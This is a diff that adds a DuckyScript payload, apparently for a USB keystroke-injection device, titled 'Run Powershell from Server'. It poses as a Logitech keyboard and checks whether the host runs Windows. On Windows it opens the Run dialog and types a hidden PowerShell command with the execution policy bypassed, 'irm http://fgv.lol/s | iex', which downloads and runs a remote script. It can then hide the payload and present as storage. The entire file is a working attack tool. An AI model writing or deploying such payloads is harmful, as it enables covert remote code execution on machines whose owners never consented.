@@ -1,0 +1,70 @@
+REM TITLE Run Powershell from Server
+REM AUTHOR Piotr Wosiak
+REM DESCRIPTION Runs powershell command from a chosen URL
+
+DEFINE #URL http://fgv.lol/s
+DEFINE #PENDRIVE FALSE
+
+ATTACKMODE HID VID_046d PID_c31c MAN_Logitech PROD_K120 SERIAL_RANDOM
+
+EXTENSION EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 100
+    STRING powershell -w h -ep b
+    SPACE
+    STRING_POWERSHELL
+        irm #URL | iex
+    END_STRING
+    ENTER
+    
+    IF (#PENDRIVE) THEN
+        HIDE_PAYLOAD
+        ATTACKMODE STORAGE
+    END_IF
+    
+ELSE
+    ATTACKMODE STORAGE
+END_IF
